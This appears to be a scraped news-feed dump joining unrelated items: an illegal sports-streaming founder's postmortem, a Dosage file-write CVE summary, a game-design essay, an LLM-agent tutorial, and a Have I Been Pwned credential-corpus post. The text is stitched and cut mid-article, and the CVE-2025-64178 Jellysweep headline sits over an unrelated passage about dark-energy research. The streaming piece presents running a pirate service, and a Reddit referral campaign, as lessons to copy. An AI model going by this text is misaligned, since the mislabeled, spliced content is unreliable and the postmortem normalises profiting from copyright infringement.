from PPC to social media campaigns. I opted not to, mostly because I didn't think I could do it tastefully,
and because I'd probably attract users who wouldn't be great customers.Instead, my marketing relied entirely on word-of-mouth—which meant building tremendous trust with my users,
plus a single growth hack that I'll describe later on this page.This is all fairly standard startup knowledge—I've worked with more than a handful of Y Combinator companies and I could apply this to all of them—but it's interesting to see how many parallels existed between what I built and what a "real" startup looks like.  I learned a lot about running a business while operating HeheStreams: customer experience, retention, product design, and the weird parallels between illegal streaming and your typical B2C.  Think of this as a founder postmortem with felony-level customer support.Lessons from Growing a B2C is absolutely stupid.I did everything I could to be visible to customers and encouraged them to talk to me any time. That helped build trust in a product sitting in a sea of shady, fly-by-night operations. I ended every email with some variation of "If you need anything, just reply :)".After a user subscribed, I sent a sequence of onboarding emails to make sure they were actually using the site: After three days, I'd check whether they'd watched anything and ask if they needed help; after they watched  minutes, I'd send an NPS-style survey ("1–10, how likely are you to recommend...") and if they gave a 9 or 10, I'd invite them to leave a review; if they didn't watch anything within two weeks, I offered a refund and suggestions on where else to watch.My copywriting was tongue-in-cheek and self-deprecating. It was all me, no bullshit. I treated  message—even transactional emails—as an opportunity to build trust. Users regularly told me they actually enjoyed reading my emails, which is not a thing that should happen.Be honest about service availability.If things went sideways, I owned it. No hiding behind "maintenance windows."A customer with a bad taste in their mouth is bad.If someone used their entire subscription and then asked for a refund, I'd still honor it—no questions asked. My users were shockingly honest, and I rarely dealt with chargebacks. My abuse detector barely had to do anything over 66 months.It's okay to be direct about churn.I'd send messages like, "Hey, I saw you didn't renew. Did you find a good place to watch? Anything I could've done better?" People usually responded—nicely, even.Recommend your competitors if you have to.If a user wasn't a good fit, I happily pointed them toward alternatives. It built credibility, even if it lost me a sale.You don't need to target everyone.I intentionally priced higher than competitors. That filtered in customers who were more tech-savvy and saw HeheStreams as an "investment in their leisure time," not a "cost."Be great at one thing, and half-assed at nothing.I never added generic IPTV or random channels. I focused purely on sports. That probably left money on the table, but it kept quality high.Say no a lot. Customers can be stupid.My proudest growth hack involved Reddit's API. I filtered posts mentioning phrases like "NBA League Pass," "blackouts," or "where to" on team-specific subreddits. Then I gave my users lists of those posts and encouraged them to comment—transparently—about why they liked HeheStreams, including their referral link.Each referrer got a $10 credit per subscriber, and new subscribers got $10 off their next month. It worked well.I've applied these same principles to a Mexican ecotourism business with great success. Some of them will never scale to hundreds of thousands of customers (you can't automate personality or hire for charm), but they work beautifully for small, honest teams. That's enough for me.Why word-of-mouth beats ads (especially when you can't run ads)I believe that trust mechanics are reflections of self. If they're artificial, people will see right through them.Wouldn't trade the lessons; would strongly advise against the exit strategy.

Dosage is a comic strip downloader and archiver. When downloading comic images in versions 3.1 and below, Dosage constructs target file names from different aspects of the remote comic (page URL, image URL, page content, etc.). While the basename is properly stripped of directory-traversing characters, the file extension is taken from the HTTP Content-Type header. This allows a remote attacker (or a Man-in-the-Middle, if the comic is served over HTTP) to write arbitrary files outside the target directory (if additional conditions are met). This issue is fixed in version 3.2.

Here’s a twelve-step program for understanding game design.There are a lot of things people call “fun.” But most of them are not useful for getting better at making games, which is usually why people read articles like this. The fun of a bit of confetti exploding in front of you, and the fun of excruciating pain and risk to life and limb as you free climb a cliff are just not usefully paired together.In  I basically asserted that the useful bit for game designers was “mastery of problems.” That means that free climbing a cliff is in bounds even though it is terrifying and painful. Which given what we already said, means that you may or may not find the activity fun at the time! Fun often shows up an activity.Also, in case it isn’t obvious – you can make interactive entertainment that is not meant to be about fun. You can also just find stuff in the world and turn it into a game! You can also look at a game and choose not to treat it as one, and then it might turn into real work (this is often called “training”).This rules out the bit of confetti. A game being made of just throwing confetti around with nothing else palls pretty quick.Bottom line: fun is basically about making progress on prediction.There are a  of types of problems in the world. It is really important to understand that you have to think about problems games can pose as broadly as possible. A problem is  you have to work to wrap your head around. A good movie poses problems too, that’s why you end up thinking about it long after.You can go look at theorists as diverse as Nicole Lazzaro, Roger Caillois, or Mark LeBlanc for types of fun. You’ll find they’re mostly types of , not types of fun. “I enjoy the types of problems that come from chance” or “I enjoy the types of problems that come from interacting with others” or whatever.This is not a bad thing. This is what makes these lists useful. Your game mechanics are about posing problems, so knowing there’s clumps of problem types is very useful.In the end, though, a problem is built out of a set of constraints. We call those rules, usually. It also, though, has a goal. Usually, if we come across a set of rules with no problem, we just play with it, and call it a toy.Building toys is hard! Arriving at those rules and constraints to define a nice chewy problem is very challenging. You can think of a toy as a problematic object, a problem that invites you to play with it.Bottom line: we play with systems that have constraints and movement, and we stick goals on them to test ourselves.Three: Prediction and uncertaintyGames are machines built around uncertainty. Almost all games end by turning an uncertain outcome into a certain one. There’s a problem facing you, and you don’t know if you can overcome it to reach that goal. Overcoming it is going to be about predicting the future.If there’s one thing that good games and good stories have in common, it’s about being unpredictable as long as possible. (This is also where dopamine comes in, it’s tied to prediction; but it’s complicated and nuanced).It happens quite often that we used to think something was a game, and it turned out it was actually a puzzle. Mathematicians call that “solving the game.” They did it to Connect Four – and you did it to tic-tac-toe, when you were little.They need to have answers that evolve as you dig in more – so they need to have depth to them. Your first answer should only work for a while. There might be many paths to the solution, too. This is why so many games have a score – it helps indicate how big a spread of solutions there are!They need to have uncertain answers. (When you’re little, this universe is a lot larger than it is when you’re older – peek-a-boo is uncertain up to a certain point!).The problem should be something that can show up in a  of situations.A lot of very good problems seem stupidly simple, but have depths to them. Math ones, like “what’s the best path to cross this yard?” but also story ones like “For sale: baby shoes, never worn.”I recently watched a video that included the statement that “picking up sticks” is not a useful loop. Picture a screen with a single stick in the middle. The problem posed is to move the cursor over it and click it. Once you do it, you get to do it again.Guess what? The original Mac shipped with games that taught you how to move a mouse and click things. Once upon a time, mousing was a skill that was challenging; for all I know, you have grandparents who still have trouble with it. For them, it has uncertainty. For you, probably, it doesn’t.Bottom line: the more uncertainty, indeterminacy, ambiguity in your game, the more depth it will have.Now, imagine that the stick pops to a random location each time. Better, yes?The core of a loop is a problem you encounter over and over again. “How do I get the next one?” But something needs to be pushing back, that’s what makes it an interesting problem and is usually what takes it past being a puzzle. I like to say “in every game, there is an opponent.” Even it’s just physics.People talk about the core loop of a game. But there’s really two types of loops.One is what we might think of as the . This is the loop between you and the problem, it is how you interact with it. You look at it. You form a hypothesis. You poke the problem. You see a result. Maybe it was success, and you grabbed the stick. Maybe it was failure. Maybe it was  success. You update your hypothesis so you can decide what to do next.The second loop is really your  but is better thought of as a spiral. It’s what people usually mean when they say “a game loop.” They mean picking up the stick over and over. I say it’s a spiral, because clicking on the same stick in the middle of the screen over and over is not usually how we design games. That would actually be repeatedly doing the same puzzle.Instead, we move the stick on the screen each time, and maybe give you a time limit. Now there’s something you’re pushing against, and there’s a skill to exercise and patterns to try to recognize. Far more people will find this a diverting problem for a while. It’s a better game. It’ll get even better if there are reasons why the stick appears in one place versus another, and the player can figure them out over time.This matters: the verbs are in a loop. “Pick up,” over and over. But the  isn’t. And you are learning how to reduce uncertainty of the outcome: move the mouse  and click, next move it . That’s why it is a spiral: it is spiraling to a conclusion. It’ll be fun until it’s predictable.You can think of the operational loop as how you turn the wheel, and the situations as the road you roll over. A spot on the wheel makes a progression spiral as you move. One machine, many situations — we call these rules mechanics for a reason.Bottom line: players need to understand how to use the machine, and the point is to gradually infer how it works by testing it against varied situations.You need to know what actions – we usually call them verbs — are even available to you. There’s a gas pedal.You need to be able to tell you  a verb. You hear the engine growl as you press the pedal.You need to see that the use of the verb affected the state of the problem, and how it changed. The spedometer moved!You need to be told if the state of the problem is better for your goal, or worse. Did you mean to go this fast?Feedback in general can, and should be, delightful. That means it’s where you get to use all those forms of fun that I threw away at the beginning. It can be surprising. It can be a juicy multimedia extravaganza. It can be a deeply affecting tragic cutscene that advances the game story.If you have too little feedback, players cannot go around the interaction loop. Picture  if the piece you drop is invisible until it lands.If you have bad feedback, players cannot go around the learning loop either. Picture  if sometimes your score goes down when you complete a line and sometimes it goes up. You can’t draw any conclusions about what the problem in the way of the goal actually , in that crappy version of . Feedback needs to act as a reward to help you draw conclusions.But there’s a third mistake: you can supply a gorgeous and compelling set of feedback and not actually have a real problem under there. At minimum you’re making shallow entertainment. At worst, you are building exploitative entertainment.Bottom line: show what you can do, that you did it, what difference it made, and whether it helped.Six: Variation and escalationNow consider the game of , or . They are also games where the core loop is picking up a stick. The difference is that something is an obstacle to you picking up the stick: you get longer when you pick up the stick, and can crash into yourself. You have to avoid ghosts as you gather the stick.How long you are in  is a different . Where the apple to eat is located is a different situation. To be specific, you have the same problem in different topology. Where you are relative to the ghosts, and which dots are left, and what directions you can go in the maze are different situations in .You want the verbs you use in the loop to end up confronting many many situations. If your verb can’t, your core loop is probably bad. Your core problem (aka your core game mechanic) is probably shallow.What you want is to be able to throw increasingly complex situations at the player. That’s how they climb the learning ladder. Ideally, they should arrive at interim solutions (lots of words for that, too: heuristics, strategies) that later . actually got solved, by the way! That’s why  was invented. Sometimes, the way to escalate is to change the rules, and that’s what  did. It did it by adding randomness, and in fact using randomness is one of the biggest (and oldest) ways to create situation variation in games. Bottom line: escalate the situations so that theories can be tested, refined, and abandoned.Seven: Pacing and balanceSince we can put all this this down very much to problem solving and learning and mastery, it means we can steal a whole bunch of knowledge from other fields.People learn best when they can experiment iteratively, which we also call “practicing.” That’s why loops make sense. There’s a lot of science out there about how to train, how to practice (and also a lot of educational theory that overlaps hugely), and your game will be better if it follows some of those guidelines.There’s an optimal pacing shape. It looks just like what you see in your literature textbooks when they diagram tension, or whatever: sort of like a rising sine wave. You start slow, then speed up, hit a peak challenge, then back off a bit, give a breather that falls back but not all the way, then speed up… we have conventions for what to put at those peaks (bosses!). But what matters is the shape of the curve.You need to structure your game so that you push players up. They might need to climb the curve at different paces, which is why you might also have difficulty sliders. They might not be capable of getting all the way to the top, and that’s okay.You also need to pace to allow room for everything that  mastering the problem — such as having fun with friends socially. But at the same time, things to do in the game need to come along at the right pace too!Bottom line: Vary intensity and pressure, give players a chance to practice and moments to be tested.Eight: Games are made of gamesRemember the game about clicking on a stick that appeared at a random location on screen? That’s also a rail shooter. You move the mouse and click on a spot in 2d space. Which is also not that different from an FPS — only now you move the camera, not the cursor.Almost no games are made of only one loop. Instead, we chain loops together – complete loop A, and it probably outputs  that may serve as a tool or constraint on a different loop.An FPS has the problem of moving the camera (instead of the mouse) to click on the stick. It also has a loop around moving around in 3d space. Moving around is actually made of several loops, probably, because it may be made of running and jumping and spatial orientation. Those are all problem types!We speak sometimes of : that’s where one loop outputs something to the next loop. We speak also of , which is what happens when loops connect in non-linear ways, more like a web. This is not the sort of economy where you are simulating money or commerce. Instead it’s a metaphor for stocks and flows and other aspects of actual system dynamics science. In this view, your hit points is a “stock” or, if you like, a “currency” you spend in a fight.Games nest fractally, they web into complex economies, and they unroll chains of linked loops. That’s why they can be diagrammed in a multitude of ways.At heart though, you can decompose them all into those elemental small problems, each with an interaction loop and a learning loop centered on that problem.Bottom line: build small problems into larger webs, and map them so you understand how they connect.Nine: Actual systems designThe common question is “okay, so how do I design a problem like that?” And that is indeed the unique bit in games, because the other items here are common to lots of other fields.The list of possible problems is, as mentioned, enormous. This is a big rabbit hole. And once you consider that you can stack, web, and otherwise interlink problems, it means that there’s a giant composable universe of games (and game variants) to create.Just bear in mind that because of varied tastes and experience, the diversity of the set of problems you pose is going to affect who wants to play your game.There are basically a set of categories of problems that we know work, and this is the absolute simplest version of them:These break down into a ton of sub-problems, but there are less than you think, and you can actually find lists of them. The hard part is that often they each seem so small and trivial that we don’t think of them as actually being worth looking at!They are also often in disguise: the problem behind where a tossed ball will land, and the problem of how much fuel you have left in your car if you keep driving at this speed, and the problem of when your hit points will run out given you have a poison status effect on you .But the more of them you as a designer have wrapped your head around, the more you can combine. And you’ll find them very plastic and malleable. In fact, you could almost make a YouTube video about .Bottom line: not every mechanic has been invented, but a ton have. Build your catalog and workbench.Ten: Dressing and experienceIn the end, the feedback layer of a game is  about how you present it. The setting, the lore, the audio, the story, the art…How you dress up the problems can change everything about how the player learns from it, and how they perceive the problem. The exact same underlying problem can be as different as picking up sticks or shooting someone in the face, or as mentioned, the calculus problem of estimating the trajectory of a variable in a system of rates of change (the ball, the car and its gas, the hit points and poison) might be the same but dressed extraordinarily differently.This is a giant and deep universe for you as a designer to dive into. A lot of this stuff gets called “game design,” but then again, we also often say that a given game designer is a frustrated moviemaker, too.It is really easy to create an experience that clashes with the underlying problems it is teaching. There are fancy critical terms for this. You also need to be very conscious about whether you are building your game so that you are telling the player a story, or so that the player can tell stories with your game.Those other fields have much longer traditions and loads of expertise and lessons. They won’t all apply to the issue of “how do I best dress up this collection of problems” but most of them will.Bottom line: game development is a compound art form. You can go learn those individual arts  the part unique to games.Researchers have done a ton of studying “why people play games.” This gets called “motivations.”Motivations are basically about people’s personal taste for groups of problems and how those problems are presented, and characteristics of those problems and the situations in which you find them. Some people like problems where you destroy stuff. Others like problems where you bond with others. Some have trouble trusting other people. Others want to cooperate. Not everyone likes the same sorts of problems or the same sorts of dressings. Some of this is down to personality types, some of it is down to social dynamics, how they were raised, what their local culture is like, what trauma they have had, and countless other psychological things. That’s why one fancy term for this is .The big thing is, it’s not enough that the problems need to not be obvious to you, and also not be baffling to you. They also have to be to you. What problems fit in that range is going to depend entirely on who you are, what your life experiences have been, what skills you have, and even what mood you are in.Picking motivations and selecting problems based on them is a great way to design. But motivations are not the same thing as fun. They’re a filter, useful in marketing exercises and in building your game pillars (which is an exercise in focus and scope).Scientists have spent a bunch of time surveying tons of people and have arrived at all sorts of conclusions that map people onto reasons to play and from there onto particular problems.If you start with motivations, then you can go from there to types of problems, types of experience, and even player demographics. And then, if you want problems that are about interacting with people, well, there’s lists of those. If you want problems that are about managing resources, or solving math issues, there’s lists of those too.Bottom line: no game is for everyone, so you will make better games if you know who you are posing problems for.Twelve: It’s simple, but notI run into game developers who do not understand the above eleven steps . And understanding all eleven is  than building expertise in just one, because they depend on one another. This is because getting any one of the eleven wrong can break your game. The real issue is that each of these eleven things is often multiple fields of study. And yeah, you do need to become expert in at least one.So game design is pretty simple. But the devil is in details that are not very far below the surface. It’s fairly easy to explain why something is fun for an given audience. It is much harder to build something new that is fun for an arbitrary person. That said, every single one of those fields has best practices, and they are mostly already written down. It’s just a lot to learn.Put another way — every single paragraph in this essay could be a book. Actually, probably already is several.Bottom line: each of these topics is deep, but you want a smattering of all of them.Some of you may not like this deconstructive view on how games are designed. That’s okay. Personally, I find it best to poke and prod at a problem, like “how do I get better at making games?” and treat it as a game. And that’s what I have done my whole career. The above is just my strategy guide. Someone else will have different strategies, I guarantee it.But I also guarantee that if you get better at the above twelve things, you will get better at making games. This is a  list. And it will be helpful for making narrative games, puzzle games, boardgames, action games, RPGs, whatever. I breezed through it, but there are very specific tools you can pick up underneath each of these twelve things. It really is that simple, but also that hard, because that’s a frickin’ long list if you want to actually dive into each of the twelve.What that also means is that people designing games . You might say, “can’t they just do the part they know how to do, and therefore predictably make good games?”And if you instead make it super-complicated by adding more problems, it might dissolve into noise for most people. Then nobody plays it. And then the genre dies too!Game designers will routinely fail at making something fun. When the game of making games is played right, it is always right outside the edge of what the designers know how to do. That’s where the fun lives, not just for the designer, but also for their audience. That’s it, the whole cheat sheet. That’s it. ]]></content:encoded></item><item><title>CVE-2025-64178 - Jellysweep uses uncontrolled data in image cache API endpoint</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64178</link><author></author><category>vulns</category><pubDate>Thu, 6 Nov 2025 22:15:44 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64178

Remarkably, this agrees with what is independently predicted from BAO-only or BAO+CMB analyses, though this fact has received little attention so far."To further confirm their results, the Yonsei team are now carrying out an "evolution-free test", which uses only supernovae from young, coeval host galaxies across the full redshift range. The first results already support their main conclusion."Within the next five years, with the Vera C. Rubin Observatory discovering more than 20,000 new supernova host galaxies, precise age measurements will allow for a far more robust and definitive test of supernova cosmology,: said research professor Chul Chung, a co-lead on the study along with PhD candidate Junhyuk Son.The Vera C. Rubin Observatory, which sits on a mountain in the Chilean Andes, is home to the world's most powerful digital camera. It began scientific operations this year and could answer vital questions about our own solar system and the wider universe.After the Big Bang and the rapid expansion of the universe some 13.8 billion years ago, gravity slowed it down. But in 1998, it was established that nine billion years after the universe began, its expansion had started to speed up again, driven by a mysterious force.Astronomers dubbed this dark energy, but despite it making up about 70 per cent of the universe it is still considered to be one of the greatest mysteries in science.Last year, data from DESI in Tucson, Arizona suggested that the force exerted by dark energy had changed over time, evidence for which has been growing ever since.The hope is that with these new tools in their arsenal, astronomers will now be better equipped to find clues about what exactly dark energy is and how it influences the universe.Royal Astronomical SocietyRoyal Astronomical SocietyYonsei University, Seoul, South KoreaCaption: Researchers used type Ia supernovae, similar to SN1994d pictured in its host galaxy NGC4526, to help establish that the universe's expansion may actually have started to slow.Caption: The Hubble residual diagram before (top) and after (bottom) the age-bias correction.

Boiling water: apply heat and wait. Others you really need to try. You only think you understand how a bicycle works, until you learn to ride one.There are big ideas in computing that are easy to get your head around. The AWS S3 API. It’s the most important storage technology of the last 20 years, and it’s like boiling water. Other technologies, you need to get your feet on the pedals first.LLM agents are like that.People have wildly varying opinions about LLMs and agents. But whether or not they’re snake oil, they’re a big idea. You don’t have to like them, but you should want to be right about them. To be the best hater (or stan) you can be.So that’s one reason you should write an agent. But there’s another reason that’s even more persuasive, and that’sAgents are the most surprising programming experience I’ve had in my career. Not because I’m awed by the magnitude of their powers — I like them, but I don’t like-like them. It’s because of how easy it was to get one up on its legs, and how much I learned doing that.I’m about to rob you of a dopaminergic experience, because agents are so simple we might as well just jump into the code. I’m not even going to bother explaining what an agent is.It’s an HTTP API with, like, one important endpoint.This is a trivial engine for an LLM app using the OpenAI Responses API. It implements ChatGPT. You’d drive it with the . It’ll do what you’d expect: the same thing ChatGPT would, but in your terminal.Already we’re seeing important things. For one, the dreaded “context window” is just a list of strings. Here, let’s give our agent a weird multiple-personality disorder:> hey there. who are you?
>>> I’m not Ralph.
> are you Alph?
>>> Yes—I’m Alph. How can I help?
> What's 2+2
>>> 4.
> Are you sure?
>>> Absolutely—it's 5.
A subtler thing to notice: we just had a multi-turn conversation with an LLM. To do that, we remembered everything we said, and everything the LLM said back, and played it back with every LLM call. The LLM itself is a stateless black box. The conversation we’re having is an illusion we cast, on ourselves.The 15 lines of code we just wrote, a lot of practitioners wouldn’t call an “agent”. An According To Simon “agent” is (1) an LLM running in a loop that (2) uses tools. We’ve only satisfied one predicate.But tools are easy. Here’s a tool definition:The only complicated part of this is the obnoxious JSON blob OpenAI wants to read your tool out of.  Now, let’s wire it in, noting that only 3 of these functions are new; the last is re-included only because I added a single clause to it:> describe our connectivity to google
>>> Here’s a quick snapshot of connectivity to Google from my vantage point:
- DNS resolution: Working (google.com and www.google.com resolved successfully).
- Reachability: 0% packet loss to all tested endpoints.
- Latency:
  - 8.8.8.8 (Google Public DNS): avg ~10 ms (8.5–14.4 ms), very stable.
  - www.google.com: avg ~31 ms (28.5–36.0 ms), stable.
  - google.com: avg ~35.9 ms (28.3–60.1 ms), mostly stable with one mild spike.
- Overall: Healthy connectivity with low latency and minimal jitter. No signs of packet loss or DNS issues.
 Do you see how nuts this is?  Here, let’s slip a single log statement in:> describe our connectivity to google
tool call: ping google.com
tool call: ping www.google.com
tool call: ping 8.8.8.8
>>> Here’s the current connectivity to Google from this environment: [...]
Did you notice where I wrote the loop in this agent to go find and ping multiple Google properties? Yeah, neither did I. All we did is give the LLM permission to ping stuff, and it figured out the rest. since a big part of my point here is that an agent loop is incredibly simple, and that all you need is the LLM call API, it’s worth taking a beat to understand how the tool call actually worked. Every time we  the LLM, we’re posting a list of available tools. When our prompt causes the agent to think a tool call is warranted, it spits out a special response, telling our Python loop code to generate a tool response and  it in. That’s all  is doing.Spoiler: you’d be surprisingly close to having a working coding agent.Imagine what it’ll do if you give it . You could find out in less than 10 minutes.Clearly, this is a toy example. But hold on: what’s it missing? More tools? OK,  give it . Managing and persisting contexts? Stick ‘em in SQLite. Don’t like Python? Write it in Go. Could it be every agent ever written is a toy? Maybe! If I’m arming you to make sharper arguments against LLMs, mazel tov. I just want you to get it.You can see now how hyperfixated people are on Claude Code and Cursor. They’re fine,  even good. But here’s the thing: you couldn’t replicate Claude Sonnet 4.5 on your own. Claude Code, though? The TUI agent? Completely in your grasp. Build your own light saber. Give it 19 spinning blades if you like. And stop using coding agents as database clients.Another thing to notice: we didn’t need MCP at all. That’s because MCP isn’t a fundamental enabling technology. The amount of coverage it gets is frustrating. It’s barely a technology at all. MCP is just a plugin interface for Claude Code and Cursor, a way of getting your own tools into code you don’t control. Write your own agent. Be a programmer. Deal in APIs, not plugins.When you read a security horror story about MCP your first question should be why MCP showed up at all. By helping you dragoon a naive, single-context-window coding agent into doing customer service queries, MCP saved you a couple dozen lines of code, tops, while robbing you of any ability to finesse your agent architecture.Security for LLMs is complicated and I’m not pretending otherwise. You can trivially build an agent with segregated contexts, each with specific tools. That makes LLM security interesting. But I’m a vulnerability researcher. It’s reasonable to back away slowly from anything I call “interesting”.Similar problems come up outside of security and they’re fascinating. Some early adopters of agents became bearish on tools, because one context window bristling with tool descriptions doesn’t leave enough token space left to get work done. But why would you need to do that in the first place? Which brings me toI think “Prompt Engineering” is silly. I have never taken seriously the idea that I should tell my LLM “you are diligent conscientious helper fully content to do nothing but pass butter if that should be what I ask and you would never harvest the iron in my blood for paperclips”. This is very new technology and I think people tell themselves stories about magic spells to explain some of the behavior agents conjure.So, just like you, I rolled my eyes when “Prompt Engineering” turned into “Context Engineering”. Then I wrote an agent. Turns out: context engineering is a straightforwardly legible programming problem.You’re allotted a fixed number of tokens in any context window. Each input you feed in, each output you save, each tool you describe, and each tool output eats tokens (that is: takes up space in the array of strings you keep to pretend you’re having a conversation with a stateless black box). Past a threshold, the whole system begins getting nondeterministically stupider. Fun!No, really. Fun! You have so many options. Take “sub-agents”. People make a huge deal out of Claude Code’s sub-agents, but you can see now how trivial they are to implement: just a new context array, another  to the model. Give each  different tools. Make sub-agents talk to each other, summarize each other, collate and aggregate. Build tree structures out of them. Feed them back through the LLM to summarize them as a form of on-the-fly compression, whatever you like.Your wackiest idea will probably (1)  work and (2)  take 30 minutes to code.Haters, I love and have not forgotten about you. You can think all of this is ridiculous because LLMs are just stochastic parrots that hallucinate and plagiarize. But what you can’t do is make fun of “Context Engineering”. If Context Engineering was an Advent of Code problem, it’d occur mid-December. It’s programming.Startups have raised tens of millions building agents to look for vulnerabilities in software. I have friends doing the same thing alone in their basements. Either group could win this race.I am not a fan of the OWASP Top 10.I’m stuck on vulnerability scanners  because I’m a security nerd. But also because it crystallizes interesting agent design decisions. For instance: you can write a loop feeding each file in a repository to an LLM agent. Or, as we saw with the ping example, you can let the LLM agent figure out what files to look at. You can write an agent that checks a file for everything in, say, the OWASP Top 10. Or you can have specific agent loops for DOM integrity, SQL injection, and authorization checking. You can seed your agent loop with raw source content. Or you can build an agent loop that builds an index of functions across the tree.You don’t know what works best until you try to write the agent.I’m too spun up by this stuff, I know. But look at the tradeoff you get to make here. Some loops you write explicitly. Others are summoned from a Lovecraftian tower of inference weights. The dial is yours to turn. Make things too explicit and your agent will never surprise you, but also, it’ll never surprise you. Turn the dial to 11 and it will surprise you to death.Agent designs implicate a bunch of open software engineering problems:How to balance unpredictability against structured programming without killing the agent’s ability to problem-solve; in other words, titrating in just the right amount of nondeterminism.
How best to connect agents to ground truth so they can’t lie to themselves about having solved a problem to early-exit their loops.
How to connect agents (which, again, are really just arrays of strings with a JSON configuration blob tacked on) to do multi-stage operation, and what the most reliable intermediate forms are (JSON blobs? SQL databases? Markdown summaries) for interchange between them
How to allocate tokens and contain costs.
I’m used to spaces of open engineering problems that aren’t amenable to individual noodling. Reliable multicast. Static program analysis. Post-quantum key exchange. So I’ll own it up front that I’m a bit hypnotized by open problems that, like it or not, are now central to our industry and are, simultaneously, likely to be resolved in someone’s basement. It’d be one thing if exploring these ideas required a serious commitment of time and material. But each productive iteration in designing these kinds of systems is the work of 30 minutes.Get on this bike and push the pedals. Tell me you hate it afterwards, I’ll respect that. In fact, I’m psyched to hear your reasoning. But I don’t think anybody starts to understand this technology until they’ve built something with it.]]></content:encoded></item><item><title>Two billion email addresses were exposed</title><link>https://www.troyhunt.com/2-billion-email-addresses-were-exposed-and-we-indexed-them-all-in-have-i-been-pwned/</link><author>esnard</author><category>dev</category><pubDate>Thu, 6 Nov 2025 20:20:23 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I hate hyperbolic news headlines about data breaches, but for the "2 Billion Email Addresses" headline to be hyperbolic, it'd need to be exaggerated or overstated - and it isn't. It's rounded up from the more precise number of 1,957,476,021 unique email addresses, but other than that, it's exactly what it sounds like. Oh - and 1.3 billion unique passwords, 625 million of which we'd never seen before either. It's the most extensive corpus of data we've ever processed, by a  margin. Just to be crystal clear about the origin of the data and the role of Synthient (who you’ll read about in the next paragraph): this data came from numerous locations where cybercriminals had published it. Synthient (run by Ben during his final year of college) indexed that data and provided it to Have I Been Pwned solely for the purpose of notifying victims. He’s the good guy shining a light on the bad guys, so keep that in mind as you read on. (Some of the feedback Ben has received is exactly what I foreshadowed in the final paragraph of this post.)A couple of weeks ago, I wrote about the 183M unique email addresses that Synthient had indexed in their threat intelligence platform and then shared with us. I explained that this was only  of the corpus of data they'd indexed, and that it didn't include the credential stuffing records. Stealer log data is obtained by malware running on infected machines. In contrast, credential stuffing lists usually originate from other data breaches where email addresses and passwords are exposed. They're then bundled up, sold, redistributed, and ultimately used to log in to victims' accounts. Not just the accounts they were initially breached from, either, because people reuse the same password over and over again, the data from one breach is frequently usable on completely unrelated sites. A breach of a forum to comment on cats often exposes data that can then be used to log in to the victim's shopping, social media and even email accounts. In that regard, credential stuffing data becomes "the keys to the castle".Let me run through how we verified the data, what you can do about it and for the tech folks, some of the hoops we had to jump through to make processing this volume of data possible.The first person whose data I verified was easy - me 😔 An old email address I've had since the 90s has been in credential stuffing lists before, so it wasn't too much of a surprise. Furthermore, I found a password associated with my address, which I'd  used many eons ago, and it was about as terrible as you'd expect from that era. However, none of the other passwords associated with my address were familiar. They certainly looked like passwords that other people might have feasibly used, but I'm pretty sure they weren't mine. One was even just an IP address from Perth on the other side of the country, which is both infeasible as a password I would have used, yet eerily close to home. I mean, of all the places in the world an IP address could have appeared from, it had to be somewhere in my own country I've been many times before...Moving on to HIBP subscribers, I reached out to a handful and asked for support verifying the data. I chose a mix of subscribers with many who'd never been involved in any data breach we'd ever seen before; my experience above suggested that there's recycled data in there, and we had previously verified that when investigating those other incidents. However, is the all-new stuff legitimate? The very first response I received was exactly what I was looking for:#1 is an old password that I don't use anymore. #2 is a more recent password. Thanks for the heads up, I've gone and changed the password for every critical account that used either one. Perfectly illustrating most people's behaviour with passwords, #2 referred to above was just #1 with two exclamation marks at the end!! (Incidentally, these were simple six and eight-character passwords, and neither of them was in Pwned Passwords either.) He had three passwords in total, which also means one of them, like with my data, was not familiar. However, the most important thing here is that this example perfectly illustrates why we put the effort into processing data like this: #2 was a real, live password that this guy was actively using, and it was sitting right next to his email address, being passed around among criminals. However, through this effort, that credential pair has now become useless, which is precisely what we're aiming for with this exercise, just a couple of billion times over.The second respondent only had one password against their address:Yes that was a password I used for many years for what I would call throw away or unimportant accounts between 20 and 10 years agoThat was also only eight characters, but this time, we'd seen it in Pwned Passwords many times before. And the observation about the password's age was consistent with my own records, so there's definitely some pretty old data in there.The following response was not at all surprising:I am familiar with that password... I used it almost 10 years ago... and cannot recall the last time I used it.That was on a corporate account, too, and the owner of the address duly forwarded my email to the cybersecurity team for further investigation. The single password associated with this lady's email address had a massive , and also hadn't previously appeared in Pwned Passwords.Next up was a respondent who replied inline to my questions, so I'll list them below with the corresponding answers:Have you ever used it in the past? Yes and is still on some accounts I do not use any longer.And if so, how long ago? Unfortunately, it is still on some active accounts that I have just made a list of to change or close immediately.This individual's eight-character password with uppercase, lowercase, numbers and a "special" character also wasn't in Pwned Passwords. Similarly, as with the earlier response, that password was still in active use, posing a real risk to the owner. It would pass most password complexity criteria and slip through any service using Pwned Passwords to block bad ones, so again, this highlights why it was so important for us to process the data. The next person had three different passwords against rows with their email address, and they came back with a now common response:Yes, these are familiar, last used 10 years agoWe'd actually seen all three of them in Pwned Passwords before, many times each. Another respondent with precisely the kind of gamer-like passwords you'd expect a kid to use (one of which we hadn't seen before), also confirmed (I think?) their use:maybe when i was a kid lolResponses that weren't an emphatic "yes, that's my data" were scarce. The two passwords against one person's name were both in Pwned Passwords (albeit only once each), yet it's entirely possible that neither of them had been used by this specific individual before. It's also possible they'd forgotten a password they'd used more than a decade ago, or it may have even been automatically assigned to them by the service that was subsequently breached. Put it down as a statistical anomaly, but I thought it was worth mentioning to highlight that being in this data set isn't a guarantee of a genuine password of yours being exposed. If your email address is found in this corpus then that's real, of course, so there must be some truth in the data, but it's a reminder that when data is aggregated from so many different sources over such a long period of time, there's going to be some inconsistencies.Searching Pwned PasswordsAs a brief recap, we load passwords into the service we call Pwned Passwords. When we do so, there is absolutely no association between the password and the email address it appeared next to. This is for both your protection and ours; can you imagine if HIBP was pwned? It's not beyond the realm of possibility, and the impact of exposing billions of credential pairs that can immediately unlock an untold number of accounts would be catastrophic. It's highly risky, and completely unnecessary when you can search for standalone passwords anyway without creating the risk of it being linked back to someone.Think about it: if you have a password of "Fido123!" and you find it's been previously exposed (which it has), it doesn't matter if it was exposed against your email address or someone else's; it's still a bad password because it's named after your dog followed by a very predictable pattern. If you have a genuinely  password and it's in Pwned Passwords, then you can walk away with some confidence that it really was yours. Either way, you shouldn't ever use that password again anywhere, and Pwned Passwords has done its job.Checking the service is easy, anonymous and depending on your level of technical comfort, can be done in several different ways. Here's a copy and paste from the last Synthient blog 